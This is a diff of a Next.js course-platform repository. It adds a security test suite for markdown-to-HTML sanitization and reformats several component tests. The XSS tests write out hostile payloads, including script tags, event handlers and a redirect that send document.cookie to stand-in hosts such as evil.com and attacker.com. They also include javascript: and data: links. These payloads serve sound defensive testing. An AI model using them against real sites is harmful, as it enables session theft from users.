+ 12:   typeof authorizationService
+ 13: >;
+ 14: describe("Security Audit: XSS Sanitization & HTML Escaping Penetration Tests", () => {
+ 15:   describe("1. Markdown to Sanitized HTML Pipeline", () => {
+ 16:     it("neutralizes raw <script> execution tags", async () => {
+ 17:       const hostilePayload = `
+ 18: # Dangerous Lesson
+ 19: <script>alert('XSS-ATTACK');</script>
+ 20: <script src="https://evil.com/malicious.js"></script>
+ 21: Regular markdown content.
+ 22:       `;
+ 23:       const cleanHtml = await markdownToSanitizedHtml(hostilePayload);
+ 24:       expect(cleanHtml).not.toContain("<script");
+ 25:       expect(cleanHtml).not.toContain("alert('XSS-ATTACK')");
+ 26:       expect(cleanHtml).not.toContain("https://evil.com/malicious.js");
+ 27:       expect(cleanHtml).toContain("Dangerous Lesson");
+ 28:       expect(cleanHtml).toContain("Regular markdown content.");
+ 29:     });
+ 30:     it("strips inline event handlers from tags (onerror, onload, onclick, onmouseover)", async () => {
+ 31:       const hostilePayload = `
+ 32: <img src="x" onerror="alert(document.cookie)" />
+ 33: <img src="https://example.com/image.png" onload="fetch('https://evil.com?c=' + document.cookie)" />
+ 34: <b onmouseover="alert('hover')">Hover me</b>
+ 35: <a href="https://example.com" onclick="stealData()">Safe looking link</a>
+ 36:       `;
+ 37:       const cleanHtml = await markdownToSanitizedHtml(hostilePayload);
+ 38:       expect(cleanHtml).not.toContain("onerror");
+ 39:       expect(cleanHtml).not.toContain("onload");
+ 40:       expect(cleanHtml).not.toContain("onmouseover");
+ 41:       expect(cleanHtml).not.toContain("onclick");
+ 42:       expect(cleanHtml).not.toContain("stealData");
+ 43:       expect(cleanHtml).not.toContain("document.cookie");
+ 44:     });
+ 45:     it("neutralizes javascript:, vbscript:, and data: pseudo-protocol schemes in links", async () => {
+ 46:       const hostilePayload = `
+ 47: [Malicious Link 1](javascript:alert(1))
+ 48: [Malicious Link 2](jav&#x09;ascript:alert(2))
+ 49: [Malicious Link 3](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
+ 50: [Malicious Link 4](vbscript:msgbox(1))
+ 51: [Valid Secure Link](https://learn.example.com/guide)
+ 52:       `;
+ 53:       const cleanHtml = await markdownToSanitizedHtml(hostilePayload);
+ 54:       expect(cleanHtml).not.toContain('href="javascript:');
+ 55:       expect(cleanHtml).not.toContain('href="data:');
+ 56:       expect(cleanHtml).not.toContain('href="vbscript:');
+ 57:       expect(cleanHtml).toContain('href="https://learn.example.com/guide"');
+ 58:     });
+ 59:     it("strictly isolates iframes to trusted video hosts (YouTube, Vimeo, Loom) over HTTPS", async () => {
+ 60:       const hostilePayload = `
+ 61: <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>
+ 62: <iframe src="https://player.vimeo.com/video/123456"></iframe>
+ 63: <iframe src="https://www.loom.com/embed/abc123xyz"></iframe>
+ 64: <iframe src="https://attacker.evil.com/phishing-login"></iframe>
+ 65: <iframe src="http://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>
+ 66: <iframe src="javascript:alert(1)"></iframe>
+ 67:       `;
+ 68:       const cleanHtml = await markdownToSanitizedHtml(hostilePayload);
+ 69:       expect(cleanHtml).toContain("https://www.youtube.com/embed/dQw4w9WgXcQ");
+ 70:       expect(cleanHtml).toContain("https://player.vimeo.com/video/123456");
+ 71:       expect(cleanHtml).toContain("https://www.loom.com/embed/abc123xyz");
+ 72:       expect(cleanHtml).not.toContain("attacker.evil.com");
+ 73:       expect(cleanHtml).not.toContain("http://www.youtube.com");
+ 74:       expect(cleanHtml).not.toContain("javascript:");
+ 75:     });
+ 76:     it("neutralizes dangerous HTML elements: object, embed, meta, base, link, svg", async () => {
+ 77:       const hostilePayload = `
+ 78: <object data="https://evil.com/exploit.swf"></object>
+ 79: <embed src="https://evil.com/exploit.swf">
+ 80: <meta http-equiv="refresh" content="0;url=https://evil.com">
+ 81: <base href="https://evil.com">
+ 82: <link rel="stylesheet" href="https://evil.com/phish.css">
+ 83: <svg onload="alert('svg-xss')"><circle r="10"/></svg>
+ 84:       `;
+ 85:       const cleanHtml = await markdownToSanitizedHtml(hostilePayload);
+ 86:       expect(cleanHtml).not.toContain("<object");
+ 87:       expect(cleanHtml).not.toContain("<embed");
+ 88:       expect(cleanHtml).not.toContain("<meta");
+ 89:       expect(cleanHtml).not.toContain("<base");
+ 90:       expect(cleanHtml).not.toContain("<link");
+ 91:       expect(cleanHtml).not.toContain("<svg");
+ 92:       expect(cleanHtml).not.toContain("svg-xss");
+ 93:       expect(cleanHtml).not.toContain("exploit.swf");
+ 94:     });
+ 95:     it("enforces rel='noopener noreferrer' and target='_blank' on external links", async () => {
+ 96:       const payload = `[Visit Antigravity](https://example.com)`;
+ 97:       const cleanHtml = await markdownToSanitizedHtml(payload);
+ 98:       expect(cleanHtml).toContain('target="_blank"');
+ 99:       expect(cleanHtml).toContain('rel="noopener noreferrer"');
+100:     });
+101:     it("safely preserves legitimate educational markdown features", async () => {
+102:       const validMarkdown = `
+103: # Master Class: React & TypeScript
+104: ## Introduction
+105: Here is an overview of **state machines** and *reducers*.
+106: ### Code Example
+107: \`\`\`typescript
+108: interface State {
+109:   count: number;
+110: }
+111: function reducer(state: State): State {
+112:   return { count: state.count + 1 };
+113: }
+114: \`\`\`
+115: ### Curriculum Checklist
+116: - Component Architecture
+117: - Performance Tuning
+118: - Security Best Practices
+119: | Module | Duration | Complexity |
+120: |---|---|---|
+121: | Architecture | 45m | Advanced |
+122: | Security | 30m | High |
+123: > Always sanitize untrusted input on the server before storage.
+124:       `;
+125:       const cleanHtml = await markdownToSanitizedHtml(validMarkdown);
+126:       expect(cleanHtml).toContain(
+127:         "<h1>Master Class: React &amp; TypeScript</h1>",
+128:       );
+129:       expect(cleanHtml).toContain("<h2>Introduction</h2>");
+130:       expect(cleanHtml).toContain("<strong>state machines</strong>");
+131:       expect(cleanHtml).toContain("<em>reducers</em>");
+132:       expect(cleanHtml).toContain("<pre><code");
+133:       expect(cleanHtml).toContain("interface State");
+134:       expect(cleanHtml).toContain("<ul>");
+135:       expect(cleanHtml).toContain("<li>Component Architecture</li>");
+136:       expect(cleanHtml).toContain("<table>");
+137:       expect(cleanHtml).toContain("<blockquote>");
+138:     });
+139:   });
+140:   describe("2. LessonContentService End-to-End XSS Neutralization", () => {
+141:     const instructorId = "instructor-secure-1";
+142:     const lessonId = "lesson-secure-1";
+143:     const mockHierarchy = {
+144:       id: lessonId,
+145:       title: "Secure Lesson",
+146:       isFreePreview: false,
+147:       moduleId: "module-1",
+148:       module: {
+149:         id: "module-1",
+150:         courseId: "course-1",
+151:         course: {
+152:           id: "course-1",
+153:           instructorId,
+154:           status: CourseStatus.DRAFT,
+155:         },
+156:       },
+157:     };
+158:     beforeEach(() => {
+159:       mockAuthService.requireAnyRole.mockResolvedValue();
+160:       mockAuthService.hasRole.mockResolvedValue(false);
+161:       mockLessonContentRepo.findLessonHierarchy.mockResolvedValue(
+162:         mockHierarchy,
+163:       );
+164:     });
+165:     it("sanitizes markdown content into bodyHtml before invoking repository upsert", async () => {
+166:       const injectedMarkdown = `
+167: # Heading with Malicious Code
+168: <script>document.location='http://attacker.com/steal?cookie=' + document.cookie;</script>
+169: <img src="x" onerror="alert('pwned')" />
+170: Safe educational notes.
+171:       `;
+172:       mockLessonContentRepo.upsertLessonContent.mockResolvedValue({
+173:         id: "content-1",
+174:         lessonId,
+175:         bodyMarkdown: injectedMarkdown,
+176:         bodyHtml: "",
+177:         videoUrl: null,
+178:         resources: null,
+179:         createdAt: new Date(),
+180:         updatedAt: new Date(),
+181:       });
+182:       await lessonContentService.updateLessonContent(instructorId, {
+183:         lessonId,
+184:         bodyMarkdown: injectedMarkdown,
+185:       });
+186:       expect(mockLessonContentRepo.upsertLessonContent).toHaveBeenCalledTimes(
+187:         1,
+188:       );
+189:       const [passedLessonId, passedPayload] =
+190:         mockLessonContentRepo.upsertLessonContent.mock.calls[0];
+191:       expect(passedLessonId).toBe(lessonId);
+192:       expect(passedPayload.bodyMarkdown).toBe(injectedMarkdown);
+193:       // Verify the persisted HTML is completely sanitized
+194:       const persistedHtml = passedPayload.bodyHtml ?? "";
+195:       expect(persistedHtml).not.toContain("<script");
+196:       expect(persistedHtml).not.toContain("document.location");
+197:       expect(persistedHtml).not.toContain("onerror");
+198:       expect(persistedHtml).not.toContain("pwned");
+199:       expect(persistedHtml).toContain("Heading with Malicious Code");
+200:       expect(persistedHtml).toContain("Safe educational notes.");
+201:     });
+202:   });
+203: });
 `````
 
 ## File: src/actions/__tests__/course.test.ts
@@ -7461,6 +8887,24 @@ tsconfig.json
 43: }
 `````
 
+## File: src/app/api/sentry-example-api/route.ts
+`````typescript
+ 1: import * as Sentry from "@sentry/nextjs";
+ 2: export const dynamic = "force-dynamic";
+ 3: class SentryExampleAPIError extends Error {
+ 4:   constructor(message: string | undefined) {
+ 5:     super(message);
+ 6:     this.name = "SentryExampleAPIError";
+ 7:   }
+ 8: }
+ 9: export function GET() {
+10:   Sentry.logger.info("Sentry example API called");
+11:   throw new SentryExampleAPIError(
+12:     "This error is raised on the backend called by the example page.",
+13:   );
+14: }
+`````
+
 ## File: src/app/courses/[slug]/learn/page.tsx
 `````typescript
  1: import { notFound, redirect } from "next/navigation";
@@ -9254,57 +10698,56 @@ tsconfig.json
 
 ## File: src/components/features/catalog/__tests__/course-card.test.tsx
 `````typescript
- 1: import React from "react";
- 2: import { render, screen } from "@testing-library/react";
- 3: import { CourseCard } from "../course-card";
- 4: import { CourseLevel } from "@prisma/client";
- 5: import type { CatalogCourseItem } from "@/services/course";
- 6: describe("CourseCard Component", () => {
- 7:   const mockCourse: CatalogCourseItem = {
- 8:     id: "c-1",
- 9:     title: "Fullstack Next.js 16",
-10:     slug: "fullstack-nextjs-16",
-11:     description: "Build robust fullstack web applications.",
-12:     thumbnailUrl: "https://example.com/thumb.jpg",
-13:     level: CourseLevel.INTERMEDIATE,
-14:     category: "Web Development",
-15:     instructor: {
-16:       id: "inst-1",
-17:       name: "Sarah Connor",
-18:       image: null,
-19:       avatarUrl: null,
-20:     },
-21:     modulesCount: 5,
-22:     totalLessons: 24,
-23:     enrollmentCount: 150,
-24:     isEnrolled: false,
-25:     progressPercentage: null,
-26:   };
-27:   it("renders course title, description, level badge, and category", () => {
-28:     render(<CourseCard course={mockCourse} />);
-29:     expect(screen.getByText("Fullstack Next.js 16")).toBeInTheDocument();
-30:     expect(
-31:       screen.getByText("Build robust fullstack web applications."),
-32:     ).toBeInTheDocument();
-33:     expect(screen.getByText("Intermediate")).toBeInTheDocument();
-34:     expect(screen.getByText("Web Development")).toBeInTheDocument();
-35:     expect(screen.getByText("Sarah Connor")).toBeInTheDocument();
-36:     expect(screen.getByText("5 modules")).toBeInTheDocument();
-37:     expect(screen.getByText("24 lessons")).toBeInTheDocument();
-38:     expect(screen.getByText("View Course")).toBeInTheDocument();
-39:   });
-40:   it("renders enrolled badge and Continue button when user is enrolled", () => {
-41:     const enrolledCourse: CatalogCourseItem = {
-42:       ...mockCourse,
-43:       isEnrolled: true,
-44:       progressPercentage: 45,
-45:     };
-46:     render(<CourseCard course={enrolledCourse} />);
-47:     expect(screen.getByText("Enrolled")).toBeInTheDocument();
-48:     expect(screen.getByText("Continue")).toBeInTheDocument();
-49:     expect(screen.getByText("45% Complete")).toBeInTheDocument();
-50:   });
-51: });
+ 1: import { render, screen } from "@testing-library/react";
+ 2: import { CourseCard } from "../course-card";
+ 3: import { CourseLevel } from "@prisma/client";
+ 4: import type { CatalogCourseItem } from "@/services/course";
+ 5: describe("CourseCard Component", () => {
+ 6:   const mockCourse: CatalogCourseItem = {
+ 7:     id: "c-1",
+ 8:     title: "Fullstack Next.js 16",
+ 9:     slug: "fullstack-nextjs-16",
+10:     description: "Build robust fullstack web applications.",
+11:     thumbnailUrl: "https://example.com/thumb.jpg",
+12:     level: CourseLevel.INTERMEDIATE,
+13:     category: "Web Development",
+14:     instructor: {
+15:       id: "inst-1",
+16:       name: "Sarah Connor",
+17:       image: null,
+18:       avatarUrl: null,
+19:     },
+20:     modulesCount: 5,
+21:     totalLessons: 24,
+22:     enrollmentCount: 150,
+23:     isEnrolled: false,
+24:     progressPercentage: null,
+25:   };
+26:   it("renders course title, description, level badge, and category", () => {
+27:     render(<CourseCard course={mockCourse} />);
+28:     expect(screen.getByText("Fullstack Next.js 16")).toBeInTheDocument();
+29:     expect(
+30:       screen.getByText("Build robust fullstack web applications."),
+31:     ).toBeInTheDocument();
+32:     expect(screen.getByText("Intermediate")).toBeInTheDocument();
+33:     expect(screen.getByText("Web Development")).toBeInTheDocument();
+34:     expect(screen.getByText("Sarah Connor")).toBeInTheDocument();
+35:     expect(screen.getByText("5 modules")).toBeInTheDocument();
+36:     expect(screen.getByText("24 lessons")).toBeInTheDocument();
+37:     expect(screen.getByText("View Course")).toBeInTheDocument();
+38:   });
+39:   it("renders enrolled badge and Continue button when user is enrolled", () => {
+40:     const enrolledCourse: CatalogCourseItem = {
+41:       ...mockCourse,
+42:       isEnrolled: true,
+43:       progressPercentage: 45,
+44:     };
+45:     render(<CourseCard course={enrolledCourse} />);
+46:     expect(screen.getByText("Enrolled")).toBeInTheDocument();
+47:     expect(screen.getByText("Continue")).toBeInTheDocument();
+48:     expect(screen.getByText("45% Complete")).toBeInTheDocument();
+49:   });
+50: });
 `````
 
 ## File: src/components/features/catalog/__tests__/course-filter-bar.test.tsx
@@ -10027,98 +11470,97 @@ tsconfig.json
 
 ## File: src/components/features/curriculum/__tests__/lesson-content-editor.test.tsx
 `````typescript
- 1: import * as React from "react";
- 2: import { render, screen, fireEvent, waitFor } from "@testing-library/react";
- 3: import { LessonContentEditor } from "../lesson-content-editor";
- 4: import * as lessonContentActions from "@/actions/lesson-content";
- 5: import { actionSuccess } from "@/lib/action-result";
- 6: jest.mock("@/actions/lesson-content");
- 7: const mockActions = lessonContentActions as jest.Mocked<
- 8:   typeof lessonContentActions
- 9: >;
-10: describe("LessonContentEditor", () => {
-11:   const lessonId = "clh1234567890123456789012";
-12:   const initialData = {
-13:     bodyMarkdown: "# Sample Lesson",
-14:     bodyHtml: "<h1>Sample Lesson</h1>",
-15:     videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-16:     resources: [{ name: "Slides", url: "https://example.com/slides.pdf" }],
-17:   };
-18:   beforeEach(() => {
-19:     jest.clearAllMocks();
-20:   });
-21:   it("renders with initial data", () => {
-22:     render(
-23:       <LessonContentEditor lessonId={lessonId} initialData={initialData} />,
-24:     );
-25:     expect(screen.getByLabelText(/Lesson Text/i)).toHaveValue(
-26:       "# Sample Lesson",
-27:     );
-28:     expect(screen.getByLabelText(/Video Lecture URL/i)).toHaveValue(
-29:       "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-30:     );
-31:     expect(screen.getByDisplayValue("Slides")).toBeInTheDocument();
-32:     expect(
-33:       screen.getByDisplayValue("https://example.com/slides.pdf"),
-34:     ).toBeInTheDocument();
-35:     expect(screen.getByText("Saved")).toBeInTheDocument();
-36:   });
-37:   it("switches to preview tab and displays rendered HTML", () => {
-38:     render(
-39:       <LessonContentEditor lessonId={lessonId} initialData={initialData} />,
-40:     );
-41:     const previewTab = screen.getByRole("button", { name: /Preview/i });
-42:     fireEvent.click(previewTab);
-43:     expect(screen.getByText("Rendered Lesson Preview")).toBeInTheDocument();
-44:     expect(screen.getByRole("heading", { level: 1 })).toHaveTextContent(
-45:       "Sample Lesson",
-46:     );
-47:   });
-48:   it("adds and removes resource items", () => {
-49:     render(
-50:       <LessonContentEditor lessonId={lessonId} initialData={initialData} />,
-51:     );
-52:     const addButton = screen.getByRole("button", { name: /Add Link/i });
-53:     fireEvent.click(addButton);
-54:     const inputs = screen.getAllByPlaceholderText(/Resource Name/i);
-55:     expect(inputs.length).toBe(2);
-56:     const deleteButtons = screen.getAllByTitle(/Remove Resource/i);
-57:     fireEvent.click(deleteButtons[1]);
-58:     expect(screen.getAllByPlaceholderText(/Resource Name/i).length).toBe(1);
-59:   });
-60:   it("triggers save action on manual save button click", async () => {
-61:     mockActions.updateLessonContentAction.mockResolvedValue(
-62:       actionSuccess({
-63:         id: "content-1",
-64:         lessonId,
-65:         bodyMarkdown: "# Sample Lesson Updated",
-66:         bodyHtml: "<h1>Sample Lesson Updated</h1>",
-67:         videoUrl: "https://www.youtube.com/embed/dQw4w9WgXcQ",
-68:         resources: initialData.resources,
-69:         createdAt: new Date(),
-70:         updatedAt: new Date(),
-71:       }),
-72:     );
-73:     render(
-74:       <LessonContentEditor lessonId={lessonId} initialData={initialData} />,
-75:     );
-76:     const textarea = screen.getByLabelText(/Lesson Text/i);
-77:     fireEvent.change(textarea, {
-78:       target: { value: "# Sample Lesson Updated" },
-79:     });
-80:     const saveButton = screen.getByRole("button", { name: /^Save$/i });
-81:     fireEvent.click(saveButton);
-82:     await waitFor(() => {
-83:       expect(mockActions.updateLessonContentAction).toHaveBeenCalledWith(
-84:         expect.objectContaining({
-85:           lessonId,
-86:           bodyMarkdown: "# Sample Lesson Updated",
-87:         }),
-88:       );
-89:     });
-90:     expect(await screen.findByText("Saved")).toBeInTheDocument();
-91:   });
-92: });
+ 1: import { render, screen, fireEvent, waitFor } from "@testing-library/react";
+ 2: import { LessonContentEditor } from "../lesson-content-editor";
+ 3: import * as lessonContentActions from "@/actions/lesson-content";
+ 4: import { actionSuccess } from "@/lib/action-result";
+ 5: jest.mock("@/actions/lesson-content");
+ 6: const mockActions = lessonContentActions as jest.Mocked<
+ 7:   typeof lessonContentActions
+ 8: >;
+ 9: describe("LessonContentEditor", () => {
+10:   const lessonId = "clh1234567890123456789012";
+11:   const initialData = {
+12:     bodyMarkdown: "# Sample Lesson",
+13:     bodyHtml: "<h1>Sample Lesson</h1>",
+14:     videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+15:     resources: [{ name: "Slides", url: "https://example.com/slides.pdf" }],
+16:   };
+17:   beforeEach(() => {
+18:     jest.clearAllMocks();
+19:   });
+20:   it("renders with initial data", () => {
+21:     render(
+22:       <LessonContentEditor lessonId={lessonId} initialData={initialData} />,
+23:     );
+24:     expect(screen.getByLabelText(/Lesson Text/i)).toHaveValue(
+25:       "# Sample Lesson",
+26:     );
+27:     expect(screen.getByLabelText(/Video Lecture URL/i)).toHaveValue(
+28:       "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+29:     );
+30:     expect(screen.getByDisplayValue("Slides")).toBeInTheDocument();
+31:     expect(
+32:       screen.getByDisplayValue("https://example.com/slides.pdf"),
+33:     ).toBeInTheDocument();
+34:     expect(screen.getByText("Saved")).toBeInTheDocument();
+35:   });
+36:   it("switches to preview tab and displays rendered HTML", () => {
+37:     render(
+38:       <LessonContentEditor lessonId={lessonId} initialData={initialData} />,
+39:     );
+40:     const previewTab = screen.getByRole("button", { name: /Preview/i });
+41:     fireEvent.click(previewTab);
+42:     expect(screen.getByText("Rendered Lesson Preview")).toBeInTheDocument();
+43:     expect(screen.getByRole("heading", { level: 1 })).toHaveTextContent(
+44:       "Sample Lesson",
+45:     );
+46:   });
+47:   it("adds and removes resource items", () => {
+48:     render(
+49:       <LessonContentEditor lessonId={lessonId} initialData={initialData} />,
+50:     );
+51:     const addButton = screen.getByRole("button", { name: /Add Link/i });
+52:     fireEvent.click(addButton);
+53:     const inputs = screen.getAllByPlaceholderText(/Resource Name/i);
+54:     expect(inputs.length).toBe(2);
+55:     const deleteButtons = screen.getAllByTitle(/Remove Resource/i);
+56:     fireEvent.click(deleteButtons[1]);
+57:     expect(screen.getAllByPlaceholderText(/Resource Name/i).length).toBe(1);
+58:   });
+59:   it("triggers save action on manual save button click", async () => {
+60:     mockActions.updateLessonContentAction.mockResolvedValue(
+61:       actionSuccess({
+62:         id: "content-1",
+63:         lessonId,
+64:         bodyMarkdown: "# Sample Lesson Updated",
+65:         bodyHtml: "<h1>Sample Lesson Updated</h1>",
+66:         videoUrl: "https://www.youtube.com/embed/dQw4w9WgXcQ",
+67:         resources: initialData.resources,
+68:         createdAt: new Date(),
+69:         updatedAt: new Date(),
+70:       }),
+71:     );
+72:     render(
+73:       <LessonContentEditor lessonId={lessonId} initialData={initialData} />,
+74:     );
+75:     const textarea = screen.getByLabelText(/Lesson Text/i);
+76:     fireEvent.change(textarea, {
+77:       target: { value: "# Sample Lesson Updated" },
+78:     });
+79:     const saveButton = screen.getByRole("button", { name: /^Save$/i });
+80:     fireEvent.click(saveButton);
+81:     await waitFor(() => {
+82:       expect(mockActions.updateLessonContentAction).toHaveBeenCalledWith(
+83:         expect.objectContaining({
+84:           lessonId,
+85:           bodyMarkdown: "# Sample Lesson Updated",
+86:         }),
+87:       );
+88:     });
+89:     expect(await screen.findByText("Saved")).toBeInTheDocument();
+90:   });
+91: });
 `````
 
 ## File: src/components/features/curriculum/lesson-content-editor.tsx
@@ -10609,80 +12051,79 @@ tsconfig.json
 
 ## File: src/components/features/enrollment/__tests__/enrollment-button.test.tsx
 `````typescript
- 1: import * as React from "react";
- 2: import { render, screen, fireEvent, waitFor } from "@testing-library/react";
- 3: import { EnrollmentButton } from "../enrollment-button";
- 4: import * as enrollmentActions from "@/actions/enrollment";
- 5: import { actionSuccess, actionFailure } from "@/lib/action-result";
- 6: jest.mock("@/actions/enrollment");
- 7: const mockActions = enrollmentActions as jest.Mocked<typeof enrollmentActions>;
- 8: describe("EnrollmentButton", () => {
- 9:   const courseId = "clh1234567890123456789012";
-10:   beforeEach(() => {
-11:     jest.clearAllMocks();
-12:   });
-13:   it("renders 'Enroll Now' when not enrolled", () => {
-14:     render(<EnrollmentButton courseId={courseId} initialIsEnrolled={false} />);
-15:     expect(
-16:       screen.getByRole("button", { name: /enroll in course/i }),
-17:     ).toBeInTheDocument();
-18:     expect(screen.getByText("Enroll Now")).toBeInTheDocument();
-19:   });
-20:   it("renders 'Enrolled' and is disabled when already enrolled", () => {
-21:     render(<EnrollmentButton courseId={courseId} initialIsEnrolled={true} />);
-22:     const button = screen.getByRole("button", { name: /already enrolled/i });
-23:     expect(button).toBeInTheDocument();
-24:     expect(button).toBeDisabled();
-25:     expect(screen.getByText("Enrolled")).toBeInTheDocument();
-26:   });
-27:   it("successfully enrolls user and transitions to 'Enrolled' state", async () => {
-28:     const onEnrollSuccess = jest.fn();
-29:     mockActions.enrollInCourseAction.mockResolvedValueOnce(
-30:       actionSuccess({
-31:         id: "enr_1",
-32:         userId: "user_1",
-33:         courseId,
-34:         status: "ACTIVE",
-35:         progressPercentage: 0,
-36:         enrolledAt: new Date(),
-37:         completedAt: null,
-38:         lastAccessedAt: new Date(),
-39:       }),
-40:     );
-41:     render(
-42:       <EnrollmentButton
-43:         courseId={courseId}
-44:         initialIsEnrolled={false}
-45:         onEnrollSuccess={onEnrollSuccess}
-46:       />,
-47:     );
-48:     const button = screen.getByRole("button", { name: /enroll in course/i });
-49:     fireEvent.click(button);
-50:     await waitFor(() => {
-51:       expect(mockActions.enrollInCourseAction).toHaveBeenCalledWith({
-52:         courseId,
-53:       });
-54:       expect(onEnrollSuccess).toHaveBeenCalledTimes(1);
-55:       expect(screen.getByText("Enrolled")).toBeInTheDocument();
-56:     });
-57:   });
-58:   it("displays error message when enrollment fails", async () => {
-59:     mockActions.enrollInCourseAction.mockResolvedValueOnce(
-60:       actionFailure(
-61:         "Cannot enroll in an unpublished course",
-62:         "VALIDATION_ERROR",
-63:       ),
-64:     );
-65:     render(<EnrollmentButton courseId={courseId} initialIsEnrolled={false} />);
-66:     const button = screen.getByRole("button", { name: /enroll in course/i });
-67:     fireEvent.click(button);
-68:     await waitFor(() => {
-69:       expect(screen.getByRole("alert")).toHaveTextContent(
-70:         "Cannot enroll in an unpublished course",
-71:       );
-72:     });
-73:   });
-74: });
+ 1: import { render, screen, fireEvent, waitFor } from "@testing-library/react";
+ 2: import { EnrollmentButton } from "../enrollment-button";
+ 3: import * as enrollmentActions from "@/actions/enrollment";
+ 4: import { actionSuccess, actionFailure } from "@/lib/action-result";
+ 5: jest.mock("@/actions/enrollment");
+ 6: const mockActions = enrollmentActions as jest.Mocked<typeof enrollmentActions>;
+ 7: describe("EnrollmentButton", () => {
+ 8:   const courseId = "clh1234567890123456789012";
+ 9:   beforeEach(() => {
+10:     jest.clearAllMocks();
+11:   });
+12:   it("renders 'Enroll Now' when not enrolled", () => {
+13:     render(<EnrollmentButton courseId={courseId} initialIsEnrolled={false} />);
+14:     expect(
+15:       screen.getByRole("button", { name: /enroll in course/i }),
+16:     ).toBeInTheDocument();
+17:     expect(screen.getByText("Enroll Now")).toBeInTheDocument();
+18:   });
+19:   it("renders 'Enrolled' and is disabled when already enrolled", () => {
+20:     render(<EnrollmentButton courseId={courseId} initialIsEnrolled={true} />);
+21:     const button = screen.getByRole("button", { name: /already enrolled/i });
+22:     expect(button).toBeInTheDocument();
+23:     expect(button).toBeDisabled();
+24:     expect(screen.getByText("Enrolled")).toBeInTheDocument();
+25:   });
+26:   it("successfully enrolls user and transitions to 'Enrolled' state", async () => {
+27:     const onEnrollSuccess = jest.fn();
+28:     mockActions.enrollInCourseAction.mockResolvedValueOnce(
+29:       actionSuccess({
+30:         id: "enr_1",
+31:         userId: "user_1",
+32:         courseId,
+33:         status: "ACTIVE",
+34:         progressPercentage: 0,
+35:         enrolledAt: new Date(),
+36:         completedAt: null,
+37:         lastAccessedAt: new Date(),
+38:       }),
+39:     );
+40:     render(
+41:       <EnrollmentButton
+42:         courseId={courseId}
+43:         initialIsEnrolled={false}
+44:         onEnrollSuccess={onEnrollSuccess}
+45:       />,
+46:     );
+47:     const button = screen.getByRole("button", { name: /enroll in course/i });
+48:     fireEvent.click(button);
+49:     await waitFor(() => {
+50:       expect(mockActions.enrollInCourseAction).toHaveBeenCalledWith({
+51:         courseId,
+52:       });
+53:       expect(onEnrollSuccess).toHaveBeenCalledTimes(1);
+54:       expect(screen.getByText("Enrolled")).toBeInTheDocument();
+55:     });
+56:   });
+57:   it("displays error message when enrollment fails", async () => {
+58:     mockActions.enrollInCourseAction.mockResolvedValueOnce(
+59:       actionFailure(
+60:         "Cannot enroll in an unpublished course",
+61:         "VALIDATION_ERROR",
+62:       ),
+63:     );
+64:     render(<EnrollmentButton courseId={courseId} initialIsEnrolled={false} />);
+65:     const button = screen.getByRole("button", { name: /enroll in course/i });
+66:     fireEvent.click(button);
+67:     await waitFor(() => {
+68:       expect(screen.getByRole("alert")).toHaveTextContent(
+69:         "Cannot enroll in an unpublished course",
+70:       );
+71:     });
+72:   });
+73: });
 `````
 
 ## File: src/components/features/enrollment/enrollment-button.tsx
@@ -13580,88 +15021,87 @@ tsconfig.json
 
 ## File: src/components/features/profile/__tests__/profile-form.test.tsx
 `````typescript
- 1: import React from "react";
- 2: import { render, screen, fireEvent, waitFor } from "@testing-library/react";
- 3: import { ProfileForm } from "../profile-form";
- 4: import * as profileActions from "@/actions/profile";
- 5: jest.mock("@/actions/profile");
- 6: const mockProfileActions = profileActions as jest.Mocked<typeof profileActions>;
- 7: describe("ProfileForm", () => {
- 8:   const initialData = {
- 9:     name: "Alex Smith",
-10:     headline: "Full Stack Engineer",
-11:     bio: "Passionate about educational software.",
-12:     website: "https://alexsmith.dev",
-13:     avatarUrl: "https://alexsmith.dev/avatar.png",
-14:   };
-15:   beforeEach(() => {
-16:     jest.clearAllMocks();
-17:   });
-18:   it("renders with initial profile values", () => {
-19:     render(<ProfileForm initialData={initialData} />);
-20:     expect(screen.getByLabelText(/full name/i)).toHaveValue("Alex Smith");
-21:     expect(screen.getByLabelText(/headline/i)).toHaveValue(
-22:       "Full Stack Engineer",
-23:     );
-24:     expect(screen.getByLabelText(/biography/i)).toHaveValue(
-25:       "Passionate about educational software.",
-26:     );
-27:     expect(screen.getByLabelText(/website/i)).toHaveValue(
-28:       "https://alexsmith.dev",
-29:     );
-30:     expect(screen.getByLabelText(/avatar url/i)).toHaveValue(
-31:       "https://alexsmith.dev/avatar.png",
-32:     );
-33:   });
-34:   it("submits updated data and displays success feedback", async () => {
-35:     mockProfileActions.updateProfileAction.mockResolvedValue({
-36:       success: true,
-37:       data: {
-38:         id: "user-1",
-39:         name: "Alex Updated",
-40:         email: "alex@example.com",
-41:         image: null,
-42:         headline: "Principal Engineer",
-43:         bio: initialData.bio,
-44:         website: initialData.website,
-45:         avatarUrl: initialData.avatarUrl,
-46:         createdAt: new Date(),
-47:       },
-48:     });
-49:     render(<ProfileForm initialData={initialData} />);
-50:     const nameInput = screen.getByLabelText(/full name/i);
-51:     fireEvent.change(nameInput, { target: { value: "Alex Updated" } });
-52:     const submitButton = screen.getByRole("button", { name: /save changes/i });
-53:     fireEvent.click(submitButton);
-54:     await waitFor(() => {
-55:       expect(mockProfileActions.updateProfileAction).toHaveBeenCalledWith(
-56:         expect.objectContaining({
-57:           name: "Alex Updated",
-58:         }),
-59:       );
-60:     });
-61:     await waitFor(() => {
-62:       expect(
-63:         screen.getByText(/profile updated successfully/i),
-64:       ).toBeInTheDocument();
-65:     });
-66:   });
-67:   it("displays error alert when action returns failure", async () => {
-68:     mockProfileActions.updateProfileAction.mockResolvedValue({
-69:       success: false,
-70:       error: "You cannot modify another user's profile",
-71:       code: "FORBIDDEN",
-72:     });
-73:     render(<ProfileForm initialData={initialData} />);
-74:     const submitButton = screen.getByRole("button", { name: /save changes/i });
-75:     fireEvent.click(submitButton);
-76:     await waitFor(() => {
-77:       expect(
-78:         screen.getByText(/you cannot modify another user's profile/i),
-79:       ).toBeInTheDocument();
-80:     });
-81:   });
-82: });
+ 1: import { render, screen, fireEvent, waitFor } from "@testing-library/react";
+ 2: import { ProfileForm } from "../profile-form";
+ 3: import * as profileActions from "@/actions/profile";
+ 4: jest.mock("@/actions/profile");
